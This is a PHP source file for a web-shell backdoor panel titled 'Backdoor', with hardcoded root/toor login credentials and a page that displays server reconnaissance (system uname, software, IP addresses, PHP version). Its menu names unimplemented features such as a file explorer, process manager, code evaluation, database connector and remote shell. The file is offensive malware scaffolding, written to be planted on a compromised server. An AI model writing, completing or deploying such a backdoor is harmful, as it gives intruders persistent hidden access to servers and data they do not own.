<?php
define("USER", "root");
define("PASS", "toor");
@ob_start();
@session_start();

$resources = [
    "style.css" => [
        "mime" => "text/css",
        "code" => base64_encode(file_get_contents("assets/css/style.css")),
    ],
    "script.js" => [
        "mime" => "application/javascript",
        "code" => base64_encode(file_get_contents("assets/js/script.js")),
    ],
    "fonts/fontawesome-webfont.woff2" => [
        "mime" => "application/font-woff2",
        "code" => base64_encode(file_get_contents("assets/fonts/fontawesome-webfont.woff2")),
    ],
    "fonts/fontawesome-webfont.woff" => [
        "mime" => "application/x-font-woff",
        "code" => base64_encode(file_get_contents("assets/fonts/fontawesome-webfont.woff")),
    ],
    "fonts/fontawesome-webfont.ttf" => [
        "mime" => "application/octet-stream",
        "code" => base64_encode(file_get_contents("assets/fonts/fontawesome-webfont.ttf")),
    ],
];

$path = ltrim($_SERVER["PATH_INFO"], "/");
if(isset($resources[$path])){
    header('Content-type: '.$resources[$path]["mime"]);
    echo base64_decode($resources[$path]["code"]);
    exit;
}

function getMainUrl() {
    return $_SERVER["SCRIPT_NAME"];
}

function asset($asset) {
    $url = getMainUrl();
    echo $url."/".$asset;
}

function redirect($url) {
    header("Location: ".getMainUrl()."/".$url);
}

function checkAuth(){
    if(!isset($_SESSION["auth"])){
        redirect("");
    }
}

$routes = [
    "main"     => "ServerController@info",
    "/"        => "AuthController@login",
    "do-login" => "AuthController@doLogin",
    "logout"   => "AuthController@logout",
];

class AuthController {

    public function login()
    {
        if(isset($_SESSION["auth"])){
            redirect("main");
        }
        ?>
            <div class="row">
                <div class="col-md-12">
                    <h1 class="text-center">Login</h1>
                    <hr>
                </div>
                <div class="col-md-4 col-md-offset-4">
                    <form class="form-horizontal" method="POST" action="<?php echo getMainUrl(); ?>/do-login">
                        <div class="form-group">
                            <label for="username">Username</label>
                            <input type="text" class="form-control" name="username" id="username">
                        </div>
                        <div class="form-group">
                            <label for="password">Password</label>
                            <input type="password" class="form-control" name="password" id="password">
                        </div>
                        <button type="submit" class="btn btn-primary btn-block">Login <i class="fa fa-sign-in"></i></button>
                    </form>
                </div>
            </div>
        <?php
    }

    public function doLogin()

    {
        if(isset($_POST["username"]) && isset($_POST["password"])){
            $username = $_POST["username"];
            $password = $_POST["password"];

            if($username == USER && $password == PASS){
                $_SESSION["auth"] = $username;
                redirect("main");
            } else {
                ?>
                <div class="row">
                    <div class="col-xs-12">
                        <div class="alert alert-danger">
                            <p>Username or Password wrong!</p>
                        </div>
                    </div>
                </div>
                <?php
            }
        }
    }

    public function logout()
    {
        session_destroy();
        redirect("");
    }

}

class ServerController {
    public function info()
    {
        ?>
        <div class="row">
            <div class="col-xs-12">
                <h1 class="text-center">Main Page</h1>
                <hr>
                <ul class="nav nav-tabs nav-justified">
                    <li role="presentation" class="active"><a href="#"><i class="fa fa-home"></i> Main</a></li>
                    <li role="presentation"><a href="#"><i class="fa fa-folder"></i> File Explorer</a></li>
                    <li role="presentation"><a href="#"><i class="fa fa-wrench"></i> Process Manager</a></li>
                    <li role="presentation"><a href="#"><i class="fa fa-code"></i> Evaluate Code</a></li>
                    <li role="presentation"><a href="#"><i class="fa fa-linux"></i> Server Info</a></li>
                    <li role="presentation"><a href="#"><i class="fa fa-bars"></i> Database Connector</a></li>
                    <li role="presentation"><a href="#"><i class="fa fa-terminal"></i> Remote Shell</a></li>
                </ul>
                <div class="well">
                    <table class="table table-hover table-bordered">
                        <tbody>
                        <tr>
                            <td>Uname</td>
                            <td><span class="label label-primary"><?php echo php_uname(); ?></span></td>
                        </tr>
                        <tr>
                            <td>Software</td>
                            <td><span class="label label-info"><?php echo getenv("SERVER_SOFTWARE"); ?></span></td>
                        </tr>
                        <tr>
                            <td>Server IP</td>
                            <td><span class="label label-success"><?php echo gethostbyname($_SERVER["HTTP_HOST"]); ?></span></td>
                        </tr>
                        <tr>
                            <td>My IP</td>
                            <td><span class="label label-danger"><?php echo $_SERVER['REMOTE_ADDR']; ?></span></td>
                        </tr>
                        <tr>
                            <td>Time</td>
                            <td><span class="label label-default"><?php echo @date("d M Y H:i:s",time()); ?></span></td>
                        </tr>
                        <tr>
                            <td>PHP Version</td>
                            <td><?php echo phpversion(); ?></td>
                        </tr>
                        </tbody>
                    </table>
                </div>
            </div>
        </div>
        <?php
    }
}

?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Backdoor</title>

    <link rel="stylesheet" href="<?php asset("style.css"); ?>">
</head>
<body>

<div class="container-fluid">
<?php
if(isset($routes[$path])){
    $exp = explode("@", $routes[$path]);
    call_user_func_array([new $exp[0] , $exp[1]], []);
} else {
    $exp = explode("@", $routes["/"]);
    call_user_func_array([new $exp[0] , $exp[1]], []);
}
?>
</div>

<script src="<?php asset("script.js"); ?>"></script>
</body>
</html>
<?php
@ob_end_flush();
?>